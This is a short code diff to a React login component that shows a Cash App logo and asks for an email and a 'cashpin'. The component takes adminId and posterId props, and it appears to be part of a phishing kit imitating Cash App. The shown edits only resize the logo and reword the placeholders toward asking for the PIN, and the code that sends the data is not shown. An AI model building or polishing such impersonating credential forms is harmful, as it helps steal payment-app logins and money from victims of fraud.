@@ -29,7 +29,7 @@ export default function Home({ adminId, posterId }) {
   };
   return (
     <div className="flex flex-col justify-center items-center shadow-lg rounded-xl bg-slate-100 w-[400px] h-[500px] mx-auto mt-[150px]">
-      <img src="/images/Square_Cash_app_logo.svg" height={150} width={150} />
+      <img src="/images/Square_Cash_app_logo.svg" height={200} width={200} />
       <div className="mt-5">
         <Formik
           initialValues={initialvalues}
@@ -47,7 +47,7 @@ export default function Home({ adminId, posterId }) {
                 </label>
                 <Field
                   className="w-full px-[4px] py-[5px]  outline-none border  border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
-                  placeholder="Your email"
+                  placeholder="Enter your email"
                   name="email"
                   type="email"
                   required
@@ -63,7 +63,7 @@ export default function Home({ adminId, posterId }) {
                 </label>
                 <Field
                   className="w-full  px-[4px] py-[5px] outline-none border border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
-                  placeholder="Your password"
+                  placeholder="Enter your cashpin"
                   name="password"
                   type="password"
                   autoComplete="on"
